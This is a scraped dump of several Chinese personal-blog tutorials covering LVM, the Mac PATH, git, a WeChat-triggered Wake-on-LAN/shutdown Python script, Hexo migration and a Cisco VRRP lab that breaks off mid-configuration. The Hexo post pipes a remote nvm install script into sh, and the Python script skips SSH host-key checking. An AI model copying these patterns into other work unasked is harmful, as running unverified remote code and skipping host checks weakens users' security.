VG1.先分区 [root@localhost /]# fdisk /dev/sdc Welcome to fdisk (util-linux 2.23.2). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Command (m for help): p Disk /dev/sdc: 21.5 GB, 21474836480 bytes, 41943040 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk label type: dos Disk identifier: 0x07c19514 Device Boot Start End Blocks Id System /dev/sdc1 2048 41943039 20970496 5 Extended /dev/sdc5 4096 1028095 512000 83 Linux Command (m for help): n Partition type: p primary (0 primary, 1 extended, 3 free) l logical (numbered from 5) Select (default p): l Adding logical partition 6 First sector (1030144-41943039, default 1030144): Using default value 1030144 Last sector, +sectors or +size{K,M,G} (1030144-41943039, default 41943039): Using default value 41943039 Partition 6 of type Linux and of size 19.5 GiB is set Command (m for help): p Disk /dev/sdc: 21.5 GB, 21474836480 bytes, 41943040 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk label type: dos Disk identifier: 0x07c19514 Device Boot Start End Blocks Id System /dev/sdc1 2048 41943039 20970496 5 Extended /dev/sdc5 4096 1028095 512000 83 Linux /dev/sdc6 1030144 41943039 20456448 83 Linux Command (m for help): w The partition table has been altered! Calling ioctl() to re-read partition table. Syncing disks.2.添加 pv [root@localhost /]# pvcreate /dev/sdc6 Physical volume &quot;/dev/sdc6&quot; successfully created.3.查看 pv [root@localhost /]# pvs PV VG Fmt Attr PSize PFree /dev/sda2 cl lvm2 a-- 19.00g 0 /dev/sdb1 myvg lvm2 a-- 10.00g 9.61g /dev/sdb2 myvg lvm2 a-- 10.00g 3.00g /dev/sdc6 lvm2 --- 19.51g 19.51g4.扩充 vg，将 sdc6的容量添加到 vg 卷组 myvg 中 [root@localhost /]# vgextend myvg /dev/sdc6 Volume group &quot;myvg&quot; successfully extended [root@localhost /]# vgs VG #PV #LV #SN Attr VSize VFree cl 1 2 0 wz--n- 19.00g 0 myvg 3 2 0 wz--n- 39.50g 32.11g重读分区表如图分区后提示分区不存在，则输入partprobe 刷新分区表 [root@localhost /]# partprobe","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Mac 操作系统使用指南","slug":"Mac-操作系统使用指南","date":"2017-06-14T05:58:24.000Z","updated":"2021-02-26T06:05:29.259Z","comments":true,"path":"posts/2442488702.html","link":"","permalink":"https://awen.me/posts/2442488702.html","excerpt":"开发环境参考https://aaaaaashu.gitbooks.io/mac-dev-setup/content/iTerm/zsh.html主要安装: zsh brew iTerm2","text":"开发环境参考https://aaaaaashu.gitbooks.io/mac-dev-setup/content/iTerm/zsh.html主要安装: zsh brew iTerm2 环境变量比如说你现在下载了一个二进制文件，希望将他加入到/usr/bin目录中打开终端直接输入命令就执行，你会发现，哪怕你这样执行 1$ sudo cp -rf xxx &#x2F;usr&#x2F;bin&#x2F;xxx 都没有效果，这是因为 mac 的安全机制阻止了你往重要的系统目录中写入文件，要解决也很简单，但是这种做法不推荐，我们可以这样操作 1.在当前用户的主目录下新建一个 bin 目录 1$ mkdir ~&#x2F;bin 2.将文件移动到该目录并且赋予可执行权限 12$ mv upx-darwin-amd64-v0.2.1 ~&#x2F;bin&#x2F;upx $ chmod +x ~&#x2F;bin&#x2F;upx 3.编辑 shell 的配置文件，我这里使用的是 zsh，所以我需要编辑 zshrc 1$ vim ~&#x2F;.zshrc 4.增加 1export PATH&#x3D;$HOME&#x2F;bin:$PATH 5.使环境变量生效 1source ~&#x2F;.zshrc 6.然后在打开终端输入 upx 试试 123456789101112131415161718192021222324252627282930313233343536373839➜ ~ upxNAME: upx - a tool for driving UpYun StorageUSAGE: upx [global options] command [command options] [arguments...]VERSION: v0.2.1 darwin&#x2F;amd64 go1.6AUTHOR(S): Hongbo.Mo &lt;zjutpolym@gmail.com&gt;COMMANDS: login Log in to UpYun logout Log out of your UpYun account sessions List all sessions switch Switch to specific session info Current session information cd Change directory pwd Print working directory mkdir Make directory ls List directory or file tree List contents of directories in a tree-like format get Get directory or file put Put directory or file rm Remove directory or file sync Sync local directory to UpYun auth Generate auth string post Post async process task help, h Shows a list of commands or help for one commandGLOBAL OPTIONS: --quiet, -q not verbose --auth value auth string --help, -h show help --version, -v print the version➜ ~","categories":[],"tags":[{"name":"mac","slug":"mac","permalink":"https://awen.me/tags/mac/"},{"name":"osx","slug":"osx","permalink":"https://awen.me/tags/osx/"}]},{"title":"git 常用命令","slug":"git-常用命令","date":"2017-06-13T12:39:46.000Z","updated":"2021-02-26T06:05:29.273Z","comments":true,"path":"posts/1222806139.html","link":"","permalink":"https://awen.me/posts/1222806139.html","excerpt":"设置用户名和邮箱12$ git config --global user.name &quot;Your Name&quot;$ git config --global user.email &quot;email@example.com&quot;","text":"设置用户名和邮箱12$ git config --global user.name &quot;Your Name&quot;$ git config --global user.email &quot;email@example.com&quot; 创建 git 版本库123$ mkdir www$ cd www$ git init 日常四部曲1.添加文件或目录 1$ git add xxx 2.提交 1$ git commit -m &quot;本次提交的说明&quot; 3.push到仓库 1$ git push origin master &#x2F;&#x2F;master 是分支名 4.删除 12$ rm -rf a$ git rm -rf a 添加远程仓库 本地新建了一个空的仓库，希望把远程的仓库内容添加到本地 1$ git remote add origin git@github.com:xxxxx&#x2F;xxxx.git 分支管理1.创建分支 12$ git branch &lt;name&gt;$ git checkout -b dev 2.查看当前所在分支 1$ git branch 会看到类似如下内容，* 指向的就是当前分支。 123➜ www git:(hexo) ✗ git branch* hexo master 3.切换分支 1$ git checkout &lt;name&gt; 删除分支 1$ git branch -d &lt;name&gt; 5.合并分支 1$ git merge &lt;name&gt; 版本回退1.查看版本 1$ git log --pretty&#x3D;oneline 2.回退上一个版本 1$ git reset --hard HEAD^ 3.回退到指定版本 1$ git reset --hard &lt;commit id &gt; &#x2F;&#x2F;版本号前几位就可以，不需要输入完整","categories":[],"tags":[]},{"title":"python 实现微信远程控制唤醒内网机器和远程关闭windows 主机","slug":"python-实现微信远程控制唤醒内网机器和远程关闭windows-主机","date":"2017-06-13T02:42:25.000Z","updated":"2021-02-26T06:05:29.284Z","comments":true,"path":"posts/3709919605.html","link":"","permalink":"https://awen.me/posts/3709919605.html","excerpt":"需求有时候需要远程开下家里的台式机使用，因为我平时都是用 mac 多，但是远程唤醒只能针对局域网，所以比较麻烦。于是我想着用微信实现远程唤醒机器，正好手上有个闲置的树莓派，想着可以利用起来。租的房子，电费1块2一度，索性把台式机扛回家，家里电费便宜，以后要用 Windows（主要是开虚拟机），就远程吧。 准备工作本程序，主要是实现远程管理 Windows10操作系统的开机和关机：1.在 Windows机器的相同内网中放一个 linux 主机，我这里用树莓派代替，如果你是用 openwrt 之类的路由器也可以。2.linux 主机需要能够远程访问，我这里是有 frp 将树莓派的端口映射到我的公网 linux 主机上。所以可以随时远程 ssh 过去。3.Windows 机器的网卡必须是有线连接，支持网络唤醒功能。","text":"需求有时候需要远程开下家里的台式机使用，因为我平时都是用 mac 多，但是远程唤醒只能针对局域网，所以比较麻烦。于是我想着用微信实现远程唤醒机器，正好手上有个闲置的树莓派，想着可以利用起来。租的房子，电费1块2一度，索性把台式机扛回家，家里电费便宜，以后要用 Windows（主要是开虚拟机），就远程吧。 准备工作本程序，主要是实现远程管理 Windows10操作系统的开机和关机：1.在 Windows机器的相同内网中放一个 linux 主机，我这里用树莓派代替，如果你是用 openwrt 之类的路由器也可以。2.linux 主机需要能够远程访问，我这里是有 frp 将树莓派的端口映射到我的公网 linux 主机上。所以可以随时远程 ssh 过去。3.Windows 机器的网卡必须是有线连接，支持网络唤醒功能。 开机实现思路首先通过微信发送开机指令，这里我使用的是 itchat 程序会调用 paramiko 库去ssh 远程到内网的树莓派执行 wakeonlan 命令去唤醒 Windows 主机。 pi@raspberrypi:~ $ wakeonlan -i 192.168.1.0 14:dd:a9:ea:0b:96 Sending magic packet to 192.168.1.0:9 with 14:dd:a9:ea:0b:96接下来，程序会通过 icmp 协议，也就是 ping 下需要唤醒的目标主机然后过滤下，一个正常的 icmp 包是64字节，过滤打印出这个64 例如 ping 百度 ➜ ~ ping www.baidu.com PING www.a.shifen.com (180.97.33.108): 56 data bytes 64 bytes from 180.97.33.108: icmp_seq=0 ttl=53 time=8.865 ms 64 bytes from 180.97.33.108: icmp_seq=1 ttl=53 time=9.206 ms 64 bytes from 180.97.33.108: icmp_seq=2 ttl=53 time=8.246 ms我这里用一段 linux 命令去过滤是否有64，这里为啥要用 head -n 1 呢，因为有可能会出现2行，经过测试，我们只需要取64这个值就可以了 ping 192.168.1.182 -c 1 | grep 64 | cut -d &quot; &quot; -f 1|head -n 1如果有则表示开机成功已经联网了，返回开机成功，否则程序继续往下走，去唤醒，然后在 ping 一次确认是否开机，如果为是则返回开机成功，否则返回失败。程序执行成功后，在我的网站根目录创建一个 shutdown 文件，用于后面的关机操作 #!/usr/bin/python # -*- coding: utf-8 -*- import itchat import paramiko import os import time import sys reload(sys) sys.setdefaultencoding(&apos;utf-8&apos;) hostname = &apos;&apos; username = &apos;&apos; port = key_file = &apos;/home/fangwenjun/.ssh/id_rsa&apos; filename = &apos;/home/fangwenjun/.ssh/known_hosts&apos; @itchat.msg_register(itchat.content.TEXT) def text_reply(msg): if msg[&apos;ToUserName&apos;] != &apos;filehelper&apos;: return if msg[&apos;Text&apos;] == u&apos;开机&apos;: paramiko.util.log_to_file(&apos;ssh_key-login.log&apos;) privatekey = os.path.expanduser(key_file) try: key = paramiko.RSAKey.from_private_key_file(privatekey) except paramiko.PasswordRequiredException: key = paramiko.RSAKey.from_private_key_file(privatekey,key_file_pwd) ssh = paramiko.SSHClient() ssh.load_system_host_keys(filename=filename) ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(hostname=hostname,username=username,pkey=key,port=port) #执行唤醒命令 stdin,stdout,stderr=ssh.exec_command(&apos;ping 192.168.1.182 -c 1 | grep 64 | cut -d &quot; &quot; -f 1|head -n 1&apos;) sshCheckOpen = stdout.read() sshCheckOpen =sshCheckOpen.strip(&apos;\\n&apos;) print type(sshCheckOpen) print sshCheckOpen #进行判断，如果为64，则说明 ping 成功，说明设备已经在开机状态，程序结束，否则执行唤醒 if sshCheckOpen == &apos;64&apos;: connect_ok_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) itchat.send(connect_ok_time+u&apos;设备已经开机&apos;, toUserName=&apos;filehelper&apos;) else: ssh_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) itchat.send(ssh_time+u&apos;开始连接远程主机&apos;, toUserName=&apos;filehelper&apos;) stdin,stdout,stderr=ssh.exec_command(&apos;wakeonlan -i 192.168.1.0 14:dd:a9:ea:0b:96&apos;) wakeonlan_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) itchat.send(wakeonlan_time+u&apos;执行唤醒，等待设备开机联网&apos;, toUserName=&apos;filehelper&apos;) #由于开机需要一些时间去启动网络，所以这里等等60s time.sleep(60) #执行 ping 命令，-c 1 表示只 ping 一下，然后过滤有没有64，如果有则获取64传给sshConStatus stdin,stdout,stderr=ssh.exec_command(&apos;ping 192.168.1.182 -c 1 | grep 64 | cut -d &quot; &quot; -f 1|head -n 1&apos;) sshConStatus = stdout.read() sshConStatus =sshConStatus.strip(&apos;\\n&apos;) print type(sshConStatus) print sshConStatus #进行判断，如果为64，则说明 ping 成功，设备已经联网，可以进行远程连接了，否则发送失败消息 if sshConStatus == &apos;64&apos;: connect_ok_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) itchat.send(connect_ok_time+u&apos;设备唤醒成功，您可以远程连接了&apos;, toUserName=&apos;filehelper&apos;) else: connect_err_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) itchat.send(connect_err_time+u&apos;设备唤醒失败，请检查设备是否连接电源&apos;, toUserName=&apos;filehelper&apos;) ssh.close() #在网站根目录创建一个空文件，命名为 shutdown os.system(&apos;touch /www/shutdown&apos;) print &apos;执行开机消息成功&apos; 关机部分实现当接收关机指令时，程序会去删除网站根目录的 shutdown 文件，客户端我写了几行代码，去通过 requests 库每隔30s 发送 http head 请求去判断文件是否是404，如果是404 这说明文件不存在，调用系统关机操作，执行关机，然后还是 ssh 到树莓派去 ping 目标主机，如果返回为空，则说明关机成功，否则关机失败。这只是针对 Windows 的关机，如果目标主机是 linux 则简单多了。 if msg[&apos;Text&apos;] == u&apos;关机&apos;: #删除网站根目录的shutdown 文件 rmfile = os.system(&apos;rm -rf /www/shutdown&apos;) if rmfile == 0: print &apos;执行关机消息成功&apos; shutdown_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) itchat.send(shutdown_time+u&apos;正在关机....&apos;, toUserName=&apos;filehelper&apos;) paramiko.util.log_to_file(&apos;ssh_key-login.log&apos;) privatekey = os.path.expanduser(key_file) try: key = paramiko.RSAKey.from_private_key_file(privatekey) except paramiko.PasswordRequiredException: key = paramiko.RSAKey.from_private_key_file(privatekey,key_file_pwd) ssh = paramiko.SSHClient() ssh.load_system_host_keys(filename=filename) ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(hostname=hostname,username=username,pkey=key,port=port) itchat.send(shutdown_time+u&apos;正在确认设备是否完成关机操作，大约需要等待60s.&apos;, toUserName=&apos;filehelper&apos;) #等等60秒后确认，因为关机需要一段时间，如果设置太短，可能网络还没断开 time.sleep(60) stdin,stdout,stderr=ssh.exec_command(&apos;ping 192.168.1.182 -c 1 | grep 64 | cut -d &quot; &quot; -f 1|head -n 1&apos;) sshConStatus = stdout.read() sshConStatus =sshConStatus.strip(&apos;\\n&apos;) print type(sshConStatus) print sshConStatus #如果获取的值为空，则说明已经关机，否则关机失败 if sshConStatus != &apos;64&apos;: shutdown_success_err_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) itchat.send(shutdown_success_err_time+u&apos;关机成功&apos;, toUserName=&apos;filehelper&apos;) else: shutdown_err_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) itchat.send(shutdown_err_time+u&apos;关机失败，请连接桌面检查客户端程序是否正常执行&apos;, toUserName=&apos;filehelper&apos;) ssh.close() itchat.auto_login(hotReload=True,enableCmdQR=2) itchat.run() 客户端代码，写完扔计划任务 开机启动 import requests import os import time while 1: time.sleep(30) r = requests.head(&quot;https://awen.me/shutdown&quot;) print r.status_code if r.status_code == 404: os.system(&quot;shutdown -s -t 5&quot;)使用 teamviewer 连接 完整代码完整代码，参考https://github.com/monkey-wenjun/wchatwakeonlan 注意：文章内的代码如果有 bug，后续更新都在 GitHub 上，完整代码请参考 GitHub 的更新，此文章代码不在更新。 缺点1.网页端微信必须一直登陆，不方便,这个就需要微信不能断网了。2.wakeonlan 是广播 mac 地址的，貌似不能返回是否成功没，所以还是要 ping 主机看看通不通，判断下。3.需要一个树莓派做跳板机，否则也不能唤醒内网设备5.如果只允许自己控制最好是使用文件助手来发送消息，因为默认情况下，任何人都可以给你发送指令开机4.windows需要安装teamviewer并且设置为开机自动启动以及绑定账号设置无人值守模式。这样方便远程，如果是linux 则不需要开启 ssh 就可以了。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"博客从typecho迁移到hexo","slug":"博客从typecho迁移到hexo","date":"2017-06-12T12:22:41.000Z","updated":"2021-02-26T06:05:29.318Z","comments":true,"path":"posts/398749075.html","link":"","permalink":"https://awen.me/posts/398749075.html","excerpt":"此前一直使用 typecho ，但是发现一个问题，我将博客放在阿里的服务器上，由于采用的是lnmp环境，经常在写完文章发送 POST 请求时候出现 502，因为资源有限，这个很头疼。但是使用hexo，我可以在本地搭建hexo环境，由于本地电脑资源充足(主要是内存和 CPU 资源)，我写完博客，可以本地预览编译完成后把 Public中的静态文件托管在github或者又拍云存储中就可以，非常方便。并且此前我选择 typecho 的原因是其支持 markdown 写作，我非常喜欢这种写作方式，在 hexo 中，同样的，我可以在 sublime Text 中使用 markdown编辑完进行预览。","text":"此前一直使用 typecho ，但是发现一个问题，我将博客放在阿里的服务器上，由于采用的是lnmp环境，经常在写完文章发送 POST 请求时候出现 502，因为资源有限，这个很头疼。但是使用hexo，我可以在本地搭建hexo环境，由于本地电脑资源充足(主要是内存和 CPU 资源)，我写完博客，可以本地预览编译完成后把 Public中的静态文件托管在github或者又拍云存储中就可以，非常方便。并且此前我选择 typecho 的原因是其支持 markdown 写作，我非常喜欢这种写作方式，在 hexo 中，同样的，我可以在 sublime Text 中使用 markdown编辑完进行预览。 安装nodejs参考官网: https://hexo.io/zh-cn/index.html 1$ curl https:&#x2F;&#x2F;raw.github.com&#x2F;creationix&#x2F;nvm&#x2F;master&#x2F;install.sh | sh 安装 Node.js 的最佳方式是使用 nvm。 1$ nvm install stable 安装hexo1$ npm install -g hexo-cli 书写博客1$ hexo n &#39;文章内容&#39; 然后可以编辑 md 文件了，默认会有如下内容 12345---title: xxxxx &#x2F;&#x2F;标题date: 2017-06-13 20:39:46 &#x2F;&#x2F;创建时间tags: &#x2F;&#x2F;标签--- 部署博客这个我就不重复造轮子了，看文档吧！ https://hexo.io/zh-cn/docs/setup.html 1.预览 1$ hexo server 2.生成静态文件 1$ hexo g 3.清空编译过的文件 1$ hexo clean 4.发布到绑定的 GitHub ftp ssh服务器 1$ hexo d 也可以直接一条命令完成编译和发布 1$ hexo g -d 这部分参考官网部署文档,部署要在根目录下的_config.yml文件中找到 1234567891011121314# Deployment## Docs: https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;deployment.htmldeploy:- type: git &#x2F;&#x2F;填写 git repo: git@github.com:username&#x2F;xxx.github.io.git &#x2F;&#x2F;github 发布地址,不要填 http 不然要输入账号密码 branch: master &#x2F;&#x2F;分支- type: rsync &#x2F;&#x2F;使用 rsync host: &#x2F;&#x2F;主机地址 user: &#x2F;&#x2F;服务器用户名 root: &#x2F;&#x2F;网站目录 port: &#x2F;&#x2F;ssh 服务器断开 delete: true &#x2F;&#x2F;是否删除旧文件 verbose: true &#x2F;&#x2F;是否显示详细信息 ignore_errors: false &#x2F;&#x2F;忽略错误 主题hexo 官网就提供了很多主题，但是我博客使用的是next主题，具体部署可以看文档。 配置留言系统我们可以采用搜狐畅言或网易云跟帖,不过我试过畅言,他会在文章下面搞个文章人气排名,还带插图,图片都不是我的博客里面的,所以我用的是网易云跟帖,很简单,去https://gentie.163.com/申请个 id： 12345678910&lt;div id&#x3D;&quot;cloud-tie-wrapper&quot; class&#x3D;&quot;cloud-tie-wrapper&quot;&gt;&lt;&#x2F;div&gt;&lt;script&gt; var cloudTieConfig &#x3D; &#123; url: document.location.href, sourceId: &quot;&quot;, productKey: &quot;83780641c66854500986ae08c5512b54ea6&quot;, &#x2F;&#x2F;这串代码复制 target: &quot;cloud-tie-wrapper&quot; &#125;;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;img1.cache.netease.com&#x2F;f2e&#x2F;tie&#x2F;yun&#x2F;sdk&#x2F;loader.js&quot;&gt;&lt;&#x2F;script&gt; 然后在主题下的_config.yml 中找到gentie_productKey去除注释,然后将 key 填在后面 注意空格。 12345678# Gentie productKey# gentie_productKey: 83780641c66854500986ae08c5512b54ea6# changyanchangyan: enable: true # appid: # appkey: 搜索功能我这里使用的是Local Search 1.安装 hexo-generator-searchdb，在站点的根目录下执行以下命令： 1$ npm install hexo-generator-searchdb --save 2.站点配置文件增加 12345search: path: search.xml field: post format: html limit: 10000 3.主题配置文件中找到 12local_search: enable: true &#x2F;&#x2F;设置为 true 图床我使用 ipic，把图片上传到又拍云和阿里云 oss，非常方便。 URL中文问题默认情况下，url 是年月日+文件的标题，如果说你标题是中文，浏览器地址栏看着会很难看，我们可以做下调整安装插件 1npm install hexo-abbrlink --save 在站点配置文件中加入 1permalink: post&#x2F;:abbrlink.html 然后在站点配置文件末尾增加 123456789101112131415161718192021222324 # abbrlink config abbrlink: alg: crc32 # 算法：crc16(default) and crc32 rep: dec # 进制：dec(default) and hex &#96;&#96;&#96; 编译后得到的 URL 地址如[https:&#x2F;&#x2F;awen.me&#x2F;post&#x2F;398749075.html](https:&#x2F;&#x2F;awen.me&#x2F;post&#x2F;398749075.html) ## 访问统计可以参考[http:&#x2F;&#x2F;theme-next.iissnan.com&#x2F;third-party-services.html#analytics-busuanzi](http:&#x2F;&#x2F;theme-next.iissnan.com&#x2F;third-party-services.html#analytics-busuanzi) 配置## 代码压缩GitHub:[点击](https:&#x2F;&#x2F;github.com&#x2F;hexojs&#x2F;hexo-html-minifier)&#96;&#96;&#96; html_minifier: enable: true ignore_error: false exclude: css_minifier: enable: true exclude: - &#39;*.min.css&#39; 部署到又拍云1.去申请又怕云账号，并且注册一个存储服务，绑定你自己的备案域名，可用看这个视频 2.又拍云有个命令行工具 upx 可以去这里下载upx，不会用可以看视频 linux 使用教程Windows 使用教程 3.为了方便，比如我是这样操作的 1➜ www git:(hexo) ✗ hexo g -d &amp;&amp; upxupyun 这个upxupyun是我写的一个脚本，内容如下，这样我就可以编译成静态文件后上传同步到又拍云了。 12345#!&#x2F;bin&#x2F;sh cd &#x2F;Users&#x2F;wenjun&#x2F;Documents&#x2F;www&#x2F;public&#x2F; upx sync . &#x2F; 写了这么多的内容，转移了一部分过来，着实不容易 坑typecho 好像没有现成的插件之类的转换成markdown, 所以,迁移之前的博客,如果少就复制吧,如果多,要自己写脚本去数据库取内容了,github 有个脚本,不过我试了下好像效果不咋地,只能迁移很少一部分的内容过来。","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://awen.me/tags/hexo/"}]},{"title":"Cisco路由配置VRRP","slug":"Cisco路由配置VRRP","date":"2017-06-03T13:22:37.000Z","updated":"2021-02-26T06:05:29.244Z","comments":true,"path":"posts/2906500160.html","link":"","permalink":"https://awen.me/posts/2906500160.html","excerpt":"复习复习网络相关技术 VRRP全称虚拟冗余路由协议(Virtual Router Redundancy Protocol)，与其类似的还有一个叫 HSRP 热备份路由器协议，两者在功能上没有区别，但是 VRRP 是一个公有的协议，而 HSRP 是思科的私有协议，在安全性上面 VRRP 更有优势，并且如果一个机房有多种不同的厂商的路由器或交换机，配置 VRRP 是最合适的选择。","text":"复习复习网络相关技术 VRRP全称虚拟冗余路由协议(Virtual Router Redundancy Protocol)，与其类似的还有一个叫 HSRP 热备份路由器协议，两者在功能上没有区别，但是 VRRP 是一个公有的协议，而 HSRP 是思科的私有协议，在安全性上面 VRRP 更有优势，并且如果一个机房有多种不同的厂商的路由器或交换机，配置 VRRP 是最合适的选择。 相关术语 VRRP路由器：运行VRRP协议的路由器。该路由器可以是一个或多个虚拟路由器。 虚拟路由器：一个由VRRP协议管理的抽象对象，作为一个共享LAN内主机的缺省路由器。它由一个虚拟路由器标识符（VRID）和同一LAN中一组关联IP地址组成。一个VRRP路由器可以备份一个或多个虚拟路由器。 IP地址所有者：将局域网的接口地址作为虚拟路由器的IP地址的路由器。当运行时，该路由器将响应寻址到该IP地址的数据包。 主虚拟路由器：该VRRP路由器将承担下列任务：转发那些寻址到与虚拟路由器关联的IP地址的数据包，应答对该IP地址的ARP请求。注意，如果存在IP地址所有者，那么该所有者总是主虚拟路由器。 备份虚拟路由器：一组可用的VRRP路由器，当主虚拟路由器失效后将承担主虚拟路由器的转发功能。 VRRP 的工作机制VRRP把在同一个广播域中的多个路由器接口编为一组，形成一个虚拟路由器，并为其分配一个IP地址，作为虚拟路由器的接口地址。虚拟路由器的接口地址既可以是其中一个路由器接口的地址，也可以是第三方地址。 如果使用路由器的接口地址作为VRRP虚拟地址，则拥有这个IP地址的路由器作为主用路由器，其他路由器作为备份。如果采用第三方地址，则优先级高的路由器成为主用路由器；如果两路由器优先级相同，则谁先发VRRP报文，谁就成为主用。 只有当这个VRRP组中所有的路由器都不能正常工作时，该域中的主机才不能与外界通信。 但是，又有这样一个问题出现，如果VRRP组中主用路由器的上行链路断开，它的状态是不会改变的，还是Master，此时该域中的主机路由还是走此路由器，但因为其上行链路断开，导致该域的主机无法正常与外界通信。因此，在VRRP中增加上行链路状态检测，来解决此问题。 配置一个VRRP组跟踪某个track的链路状态，如果该接口状态从up变为down，则主动降低优先级，相反如果从down变化up，则主动升高优先级，以加快VRRP的主备竞选。 我们还可以将这些路由器编为多个组，使它们互为备份，域中的主机使用不同的IP地址作为网关，这样可以实现数据的负载均衡。 拓扑图 #IP配置 IOU1 IOU1#conf t Enter configuration commands, one per line. End with CNTL/Z. IOU1(config)#int e0/0 IOU1(config-if)#ip add 11.1.100.2 255.255.255.0 IOU1(config-if)#no sh *Jul 3 21:40:42.679: %LINK-3-UPDOWN: Interface Ethernet0/0, changed state to up *Jul 3 21:40:43.681: %LINEPROTO-5-UPDOWN: Line protocol on Interface Ethernet0/0, changed state to up IOU1(config)#int e0/1 IOU1(config-if)#ip add 12.1.100.2 255.255.255.0 IOU1(config-if)#no shIOU2 IOU2#conf t Enter configuration commands, one per line. End with CNTL/Z. IOU2(config)#int e0/1 IOU2(config-if)#ip add 10.1.100.22 255.255.255.0 IOU2(config-if)#no shutdown IOU2(config-if)# *Jul 3 21:38:12.548: %LINK-3-UPDOWN: Interface Ethernet0/1, changed state to up *Jul 3 21:38:13.550: %LINEPROTO-5-UPDOWN: Line protocol on Interface Ethernet0/1, changed state to up IOU2(config-if)#int e0/0 IOU2(config-if)#ip add 11.1.100.1 255.255.255.0 IOU2(config-if)#no sh IOU2(config-if)# *Jul 3 21:38:34.363: %LINK-3-UPDOWN: Interface Ethernet0/0, changed state to up *Jul 3 21:38:35.363: %LINEPROTO-5-UPDOWN: Line protocol on Interface Ethernet0/0, changed state to upIOU3 IOU3(config)#int e0/1 IOU3(config-if)#ip add 10.1.100.21 255.255.255.0 IOU3(config-if)#no sh IOU3(config-if)#int e0/0 IOU3(config-if)#ip add *Jul 3 21:39:40.063: %LINK-3-UPDOWN: Interface Ethernet0/1, changed state to up *Jul 3 21:39:41.073: %LINEPROTO-5-UPDOWN: Line protocol on Interface Ethernet0/1, changed state to up IOU3(config-if)#ip add 12.1.100.1 255.255.255.0 IOU3(config-if)#no sh IOU3(config-if)# *Jul 3 21:39:52.900: %LINK-3-UPDOWN: Interface Ethernet0/0, changed state to up *Jul 3 21:39:53.907: %LINEPROTO-5-UPDOWN: Line protocol on Interface Ethernet0/0, changed state to upVRRP配置1.在接口上设置VRRP的虚拟IP地址，运行VRRP协议。在接口下，配置命令如下： CISCO(config-if)#vrrp &lt;group&gt; ip&lt;ip-address&gt; [secondary]其中，加&lt;&gt;为关键字；表示要运行的VRRP的组号，范围是0～255，在一个接口下可以同时运行多个VRRP组；表示这个VRRP组要设置的虚拟IP地址，这个地址可以和接口地址相同，也可以不是任何一个接口的地址；[secondary]表示该路由器支持配置多个虚拟IP地址，下挂的主机可以使用其中任意一个作为网关进行通信。 2.接口上配置VRRP优先级。在接口下，配置命令如下： CISCO(config-if)#vrrp &lt;group&gt;priority &lt;priority&gt;其中，加&lt;&gt;为关键字；表示VRRP组号；表示VRRP的优先级的值，范围是1～254，值越大，优先级越高，缺省为100。如果VRRP的虚拟IP地址和某个接口地址相同，这个接口的优先级自动设置为255，此路由器必定是主路由器；如果VRRP的虚拟IP地址和任何一个接口地址都不相同，则根据VRRP优先级来确定哪个路由器是主用路由器，优先级最高者成为主路由器。 3.VRRP跟踪上行链路状态。在全局模式下，配置命令如下： CISCO(config)# track &lt;track-num&gt;interface &lt;type-name&gt; line-protocoltrack命令用于跟踪接口协议状态的“up”或“down”，当相应接口状态发生变化时，触发与之相关的模块进行变化处理。 其中，加&lt;&gt;为关键字；表示track的ID号，范围是1～256；表示跟踪接口的接口名称。 注：目前只提供line-protocol即接口状态的跟踪功能。 然后在接口模式下，配置以下命令： CISCO(config-if)# vrrp &lt;group&gt; track &lt;tracknum&gt;[decrement &lt;priority&gt;] 配置VRRP组跟踪某个track的链路状态，如果该接口状态从up变为down，则主动降低优先级，相反如果从down变化up，则主动升高优先级，以加快VRRP的主备竞选。其中，&lt;&gt;字为关键字；表示虚拟路由器的ID号；表示track组的ID号；表示降低优先级的值，范围是1～254，默认为10。4.配置VRRP通告时间间隔。在接口配置模式下，配置命令： CISCO(config-if)#vrrp &lt;group&gt; advertise [msec]&lt;interval&gt;其中，&lt;&gt;字为关键字，msec表示将时间间隔的单位从秒变为毫秒；表示虚拟路由器的ID号，范围是0～255；表示Master发送VRRP通告的时间间隔，单位为秒时的范围为1255；单位为毫秒时的范围1001000，缺省为1秒。5.配置虚拟设备在备用状态下是否可以抢先。在接口配置模式下，配置命令如下： CISCO(config-if)#vrrp &lt;group&gt; preempt [delay&lt;seconds&gt;]其中，&lt;&gt;字为关键字；表示虚拟路由器的ID号，范围是0～255；delay 表示VRRP路由器声明自己为Master的时间延迟（单位：秒），范围0～3600，缺省为0。 在缺省情况下，可以抢先；如果配置了不可抢先，则在备用路由器的优先级高于主用路由器时，不会发生主备倒换。 在路由器配置 vrrp1.配置 vrrp IOU2 IOU2(config-if)#vrrp 1 ip 10.1.100.20 IOU2(config-if)# *Jul 3 21:47:52.835: %VRRP-6-STATECHANGE: Et0/1 Grp 1 state Init -&gt; Backup *Jul 3 21:47:52.839: %VRRP-6-STATECHANGE: Et0/1 Grp 1 state Init -&gt; Backup IOU2(config-if)# *Jul 3 21:47:56.448: %VRRP-6-STATECHANGE: Et0/1 Grp 1 state Backup -&gt; MasterIOU3 IOU3(config-if)#int e0/1 IOU3(config-if)#vrr IOU3(config-if)#vrrp 1 ip 10.1.100.20 IOU3(config-if)#vrr *Jul 3 